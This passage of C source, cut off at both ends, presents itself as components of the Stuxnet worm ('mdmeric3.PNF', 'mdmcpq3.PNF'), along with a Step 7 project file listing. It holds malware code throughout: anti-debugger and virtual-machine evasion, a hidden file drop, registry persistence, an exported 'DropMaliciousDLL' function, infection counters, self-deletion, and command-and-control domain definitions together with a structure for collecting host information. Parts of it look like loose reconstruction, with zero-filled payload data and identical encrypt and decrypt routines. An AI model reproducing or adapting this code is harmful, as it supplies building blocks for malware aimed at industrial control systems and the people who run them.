}

DWORD WINAPI Export5(VOID) {
    DWORD dwCount = 0;
    S7P_FindStep7Projects(g_S7pCtx.szWindowsPath, &dwCount);
    return dwCount;
}

DWORD WINAPI Export6(VOID) {
    return S7P_CreateDirectoryStructure(g_S7pCtx.szProjectPath) ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return S7P_DropMaliciousDLL(g_S7pCtx.szProjectPath) ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return S7P_ModifyDataFile(g_S7pCtx.szProjectPath) ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return S7P_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return S7P_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return S7P_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    S7P_StopWorker();
    return 0;
}

DWORD WINAPI Export13(VOID) {
    S7P_SelfDestruct();
    return 0;
}

DWORD WINAPI Export14(VOID) {
    return (DWORD)g_S7pCtx.dwPid;
}

DWORD WINAPI Export15(VOID) {
    return S7P_VERSION;
}

DWORD WINAPI Export16(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export17(VOID) {
    return g_dwProjectCount;
}

DWORD WINAPI Export18(VOID) {
    return g_dwRecordCount;
}

DWORD WINAPI Export19(VOID) {
    return (DWORD)g_S7pCtx.hMutex;
}

DWORD WINAPI Export20(VOID) {
    return S7P_IsExpired() ? 0 : 1;
}
<ProjectName>.s7p
ApiLog\
CONN\
Global\
hOmSave7\
xyz.dll

[Sub]\

XUTILS\
listen\
xr000000.mdx
s7000001.mdx

links\
s7p00001.dbf
<projectname>.s7p
END

mdmeric3.PNF:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define MDMERIC_MAGIC                   0x4D444D52
#define MDMERIC_VERSION                 0x00010400
#define MDMERIC_FILE_SIZE               90

#define MDMERIC_REG_KEY                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define MDMERIC_REG_VALUE               L"19790509"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _MDMERIC_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[260];
    WCHAR szSystemPath[260];
    WCHAR szWindowsPath[260];
    WCHAR szInfPath[260];
    WCHAR szPNFPath[260];
    BYTE bReserved[256];
} MDMERIC_CTX, * PMDMERIC_CTX;

static MDMERIC_CTX g_MdmericCtx;
static BOOL g_bInitialized = FALSE;

static BYTE g_EncryptionKey[16] = {
    0x2C, 0x1B, 0x0D, 0xFA, 0x6E, 0xC1, 0x5C, 0x27,
    0x0A, 0x3D, 0x52, 0xF9, 0xB4, 0x2F, 0xFB, 0xF6
};

static BYTE g_MdmericData[MDMERIC_FILE_SIZE] = {
    0x53, 0x54, 0x55, 0x58, 0x00, 0x00, 0x01, 0x04,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00
};

static DWORD g_dwInfectionCount = 0;
static DWORD g_dwReadCount = 0;
static DWORD g_dwWriteCount = 0;
static DWORD g_dwDecryptCount = 0;
static DWORD g_dwEncryptCount = 0;

static BOOL MDMERIC_Init(VOID);
static VOID MDMERIC_Cleanup(VOID);
static BOOL MDMERIC_CheckMutex(VOID);
static BOOL MDMERIC_IsExpired(VOID);
static BOOL MDMERIC_CheckDebugger(VOID);
static BOOL MDMERIC_CheckVMware(VOID);
static DWORD MDMERIC_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID MDMERIC_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize);
static VOID MDMERIC_SimpleDecrypt(PBYTE pData, DWORD dwSize);
static VOID MDMERIC_SimpleEncrypt(PBYTE pData, DWORD dwSize);
static BOOL MDMERIC_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize);
static BOOL MDMERIC_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize);
static BOOL MDMERIC_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL MDMERIC_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL MDMERIC_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL MDMERIC_ExtractAndSavePNF(VOID);
static BOOL MDMERIC_WriteRegistry(VOID);
static BOOL MDMERIC_ReadRegistry(VOID);
static DWORD WINAPI MDMERIC_WorkerThread(LPVOID lpParam);
static BOOL MDMERIC_StartWorker(VOID);
static BOOL MDMERIC_StopWorker(VOID);
static BOOL MDMERIC_SelfDestruct(VOID);
static BOOL MDMERIC_Execute(VOID);
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL MDMERIC_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_MdmericCtx, sizeof(MDMERIC_CTX));
    g_MdmericCtx.dwMagic = MDMERIC_MAGIC;
    g_MdmericCtx.dwVersion = MDMERIC_VERSION;
    g_MdmericCtx.dwPid = GetCurrentProcessId();
    g_MdmericCtx.dwTid = GetCurrentThreadId();
    g_MdmericCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_MdmericCtx.csLock);
    GetModuleFileNameW(NULL, g_MdmericCtx.szModulePath, 260);
    GetSystemDirectoryW(g_MdmericCtx.szSystemPath, 260);
    GetWindowsDirectoryW(g_MdmericCtx.szWindowsPath, 260);
    wsprintfW(g_MdmericCtx.szInfPath, L"%s\\inf", g_MdmericCtx.szWindowsPath);
    wsprintfW(g_MdmericCtx.szPNFPath, L"%s\\mdmeric3.PNF", g_MdmericCtx.szInfPath);
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID MDMERIC_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_MdmericCtx.hMutex) {
        CloseHandle(g_MdmericCtx.hMutex);
        g_MdmericCtx.hMutex = NULL;
    }
    if (g_MdmericCtx.hThread) {
        CloseHandle(g_MdmericCtx.hThread);
        g_MdmericCtx.hThread = NULL;
    }
    if (g_MdmericCtx.hStopEvent) {
        CloseHandle(g_MdmericCtx.hStopEvent);
        g_MdmericCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_MdmericCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL MDMERIC_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_MdmericCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL MDMERIC_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL MDMERIC_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL MDMERIC_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD MDMERIC_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID MDMERIC_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID MDMERIC_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID MDMERIC_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL MDMERIC_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize) {
    DWORD dwKey = 0x01AE0000;
    if (!pEncrypted || dwEncryptedSize == 0 || !pDecrypted || !pdwDecryptedSize) return FALSE;
    if (dwEncryptedSize < MDMERIC_FILE_SIZE) return FALSE;
    if (*pdwDecryptedSize < MDMERIC_FILE_SIZE) return FALSE;
    memcpy(pDecrypted, pEncrypted, MDMERIC_FILE_SIZE);
    for (DWORD round = 0; round < 3; round++) {
        MDMERIC_XORDecrypt(pDecrypted, MDMERIC_FILE_SIZE, (PBYTE)&dwKey, sizeof(DWORD));
        MDMERIC_SimpleDecrypt(pDecrypted, MDMERIC_FILE_SIZE);
    }
    *pdwDecryptedSize = MDMERIC_FILE_SIZE;
    g_dwDecryptCount++;
    return TRUE;
}

static BOOL MDMERIC_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    DWORD dwKey = 0x01AE0000;
    if (!pDecrypted || dwDecryptedSize == 0 || !pEncrypted || !pdwEncryptedSize) return FALSE;
    if (dwDecryptedSize != MDMERIC_FILE_SIZE) return FALSE;
    if (*pdwEncryptedSize < MDMERIC_FILE_SIZE) return FALSE;
    memcpy(pEncrypted, pDecrypted, MDMERIC_FILE_SIZE);
    for (DWORD round = 0; round < 3; round++) {
        MDMERIC_SimpleEncrypt(pEncrypted, MDMERIC_FILE_SIZE);
        MDMERIC_XORDecrypt(pEncrypted, MDMERIC_FILE_SIZE, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwEncryptedSize = MDMERIC_FILE_SIZE;
    g_dwEncryptCount++;
    return TRUE;
}

static BOOL MDMERIC_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    g_dwReadCount++;
    return TRUE;
}

static BOOL MDMERIC_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwWriteCount++;
    return TRUE;
}

static BOOL MDMERIC_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(206), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL MDMERIC_ExtractAndSavePNF(VOID) {
    PBYTE pData;
    DWORD dwSize;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    BOOL bResult;
    if (!MDMERIC_ReadPNFFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    dwEncryptedSize = MDMERIC_FILE_SIZE;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    bResult = MDMERIC_EncryptPNF(pData, dwSize, pEncrypted, &dwEncryptedSize);
    if (bResult) {
        bResult = MDMERIC_WritePNFToDisk(g_MdmericCtx.szPNFPath, pEncrypted, dwEncryptedSize);
    }
    HeapFree(GetProcessHeap(), 0, pData);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    return bResult;
}

static BOOL MDMERIC_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, MDMERIC_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, MDMERIC_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL MDMERIC_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MDMERIC_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, MDMERIC_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI MDMERIC_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_MdmericCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (MDMERIC_IsExpired()) {
            break;
        }
        if (!MDMERIC_ReadRegistry()) {
            MDMERIC_WriteRegistry();
        }
        MDMERIC_ExtractAndSavePNF();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL MDMERIC_StartWorker(VOID) {
    g_MdmericCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_MdmericCtx.hStopEvent) return FALSE;
    g_MdmericCtx.hThread = CreateThread(NULL, 0, MDMERIC_WorkerThread, NULL, 0, NULL);
    if (!g_MdmericCtx.hThread) {
        CloseHandle(g_MdmericCtx.hStopEvent);
        g_MdmericCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL MDMERIC_StopWorker(VOID) {
    if (g_MdmericCtx.hStopEvent) {
        SetEvent(g_MdmericCtx.hStopEvent);
    }
    if (g_MdmericCtx.hThread) {
        WaitForSingleObject(g_MdmericCtx.hThread, 5000);
        CloseHandle(g_MdmericCtx.hThread);
        g_MdmericCtx.hThread = NULL;
    }
    if (g_MdmericCtx.hStopEvent) {
        CloseHandle(g_MdmericCtx.hStopEvent);
        g_MdmericCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL MDMERIC_SelfDestruct(VOID) {
    DeleteFileW(g_MdmericCtx.szPNFPath);
    return TRUE;
}

static BOOL MDMERIC_Execute(VOID) {
    HANDLE hMutex;
    if (!MDMERIC_Init()) return FALSE;
    if (MDMERIC_IsExpired()) {
        MDMERIC_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        MDMERIC_Cleanup();
        return FALSE;
    }
    if (MDMERIC_CheckDebugger()) {
        CloseHandle(hMutex);
        MDMERIC_Cleanup();
        return FALSE;
    }
    if (MDMERIC_CheckVMware()) {
        CloseHandle(hMutex);
        MDMERIC_Cleanup();
        return FALSE;
    }
    MDMERIC_WriteRegistry();
    MDMERIC_ReadRegistry();
    MDMERIC_ExtractAndSavePNF();
    MDMERIC_StartWorker();
    while (WaitForSingleObject(g_MdmericCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (MDMERIC_IsExpired()) {
            break;
        }
        MDMERIC_ExtractAndSavePNF();
    }
    MDMERIC_StopWorker();
    MDMERIC_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            MDMERIC_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MDMERIC_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return MDMERIC_ExtractAndSavePNF() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!MDMERIC_ReadPNFFromDisk(g_MdmericCtx.szPNFPath, &pData, &dwSize)) {
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    PBYTE pDecrypted;
    DWORD dwDecryptedSize;
    BOOL bResult;
    if (!MDMERIC_ReadPNFFromDisk(g_MdmericCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return 1;
    }
    dwDecryptedSize = MDMERIC_FILE_SIZE;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    bResult = MDMERIC_DecryptPNF(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return bResult ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return MDMERIC_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return MDMERIC_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return MDMERIC_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    MDMERIC_StopWorker();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    MDMERIC_SelfDestruct();
    return 0;
}

DWORD WINAPI Export10(VOID) {
    return (DWORD)g_MdmericCtx.dwPid;
}

DWORD WINAPI Export11(VOID) {
    return MDMERIC_VERSION;
}

DWORD WINAPI Export12(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export13(VOID) {
    return g_dwReadCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return g_dwDecryptCount;
}

DWORD WINAPI Export16(VOID) {
    return g_dwEncryptCount;
}

DWORD WINAPI Export17(VOID) {
    return (DWORD)g_MdmericCtx.hMutex;
}

DWORD WINAPI Export18(VOID) {
    return MDMERIC_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return MDMERIC_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export20(VOID) {
    return MDMERIC_CheckVMware() ? 0 : 1;
}
END

mdmcpq3.PNF:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define MDMCPQ_MAGIC                    0x4D444350
#define MDMCPQ_VERSION                  0x00010400
#define MDMCPQ_CONFIG_SIZE              1860
#define MDMCPQ_FILE_SIZE                4943
#define MDMCPQ_MAX_PATH                 260
#define MDMCPQ_BUFFER_SIZE              8192

#define MDMCPQ_REG_KEY                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define MDMCPQ_REG_VALUE                L"19790509"

#define MDMCPQ_URL_WINDOWSUPDATE        "www.windowsupdate.com"
#define MDMCPQ_URL_MSN                  "www.msn.com"
#define MDMCPQ_URL_UPDATE1              "www.mypremierfutbol.com"
#define MDMCPQ_URL_UPDATE2              "www.todaysfutbol.com"

#define MDMCPQ_FLAG_ENCRYPTED           0x00000001
#define MDMCPQ_FLAG_COMPRESSED          0x00000002
#define MDMCPQ_FLAG_VALID               0x00000004
#define MDMCPQ_FLAG_ACTIVE              0x00000008

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _MDMCPQ_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwConfigSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwFlags;
    DWORD dwReserved[8];
} MDMCPQ_HEADER, * PMDMCPQ_HEADER;

typedef struct _MDMCPQ_CONFIG {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwActivationTime;
    DWORD dwExpirationTime;
    DWORD dwPropagationFlags;
    DWORD dwReserved1[4];
    CHAR szUpdateURL1[256];
    CHAR szUpdateURL2[256];
    CHAR szCheckURL1[256];
    CHAR szCheckURL2[256];
    BYTE bReserved[1024];
} MDMCPQ_CONFIG, * PMDMCPQ_CONFIG;

typedef struct _MDMCPQ_HOST_INFO {
    DWORD dwIPAddress;
    DWORD dwOSVersion;
    DWORD dwOSBuild;
    DWORD dwWinCCVersion;
    DWORD dwStep7Version;
    WCHAR szUserName[256];
    BYTE bReserved[256];
} MDMCPQ_HOST_INFO, * PMDMCPQ_HOST_INFO;

typedef struct _MDMCPQ_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[MDMCPQ_MAX_PATH];
    WCHAR szSystemPath[MDMCPQ_MAX_PATH];
    WCHAR szWindowsPath[MDMCPQ_MAX_PATH];
    WCHAR szInfPath[MDMCPQ_MAX_PATH];
    WCHAR szPNFPath[MDMCPQ_MAX_PATH];
    BYTE bReserved[256];
} MDMCPQ_CTX, * PMDMCPQ_CTX;

static MDMCPQ_CTX g_MdmcpqCtx;
static BOOL g_bInitialized = FALSE;
static MDMCPQ_CONFIG g_Config;
static MDMCPQ_HOST_INFO g_HostInfo;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwReadCount = 0;
static DWORD g_dwWriteCount = 0;
static DWORD g_dwDecryptCount = 0;
static DWORD g_dwEncryptCount = 0;

static BYTE g_EncryptionKey[16] = {
    0x1C, 0x0B, 0xFD, 0xEA, 0x5E, 0xB1, 0x4C, 0x17,
    0xFA, 0x2D, 0x42, 0xE9, 0xA4, 0x1F, 0xEB, 0xE6
};

static BYTE g_MdmcpqData[MDMCPQ_FILE_SIZE] = {0};

static BOOL MDMCPQ_InitNtImports(VOID);
static BOOL MDMCPQ_Init(VOID);
static VOID MDMCPQ_Cleanup(VOID);
static BOOL MDMCPQ_CheckMutex(VOID);
static BOOL MDMCPQ_IsExpired(VOID);
static BOOL MDMCPQ_CheckDebugger(VOID);
static BOOL MDMCPQ_CheckVMware(VOID);
static DWORD MDMCPQ_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID MDMCPQ_XORDecrypt(PBYTE pData, DWORD dwSize, BYTE bKey);
static VOID MDMCPQ_XOREncrypt(PBYTE pData, DWORD dwSize, BYTE bKey);
static BOOL MDMCPQ_DecryptConfig(PBYTE pEncrypted, DWORD dwEncryptedSize, PMDMCPQ_CONFIG pConfig);
static BOOL MDMCPQ_EncryptConfig(PMDMCPQ_CONFIG pConfig, PBYTE pEncrypted, PDWORD pdwEncryptedSize);
static BOOL MDMCPQ_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL MDMCPQ_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL MDMCPQ_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL MDMCPQ_BuildConfigData(VOID);
static BOOL MDMCPQ_BuildHostInfo(VOID);
static BOOL MDMCPQ_ExtractAndSavePNF(VOID);
static BOOL MDMCPQ_WriteRegistry(VOID);
static BOOL MDMCPQ_ReadRegistry(VOID);
static DWORD WINAPI MDMCPQ_WorkerThread(LPVOID lpParam);
static BOOL MDMCPQ_StartWorker(VOID);
static BOOL MDMCPQ_StopWorker(VOID);
static BOOL MDMCPQ_SelfDestruct(VOID);
static BOOL MDMCPQ_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
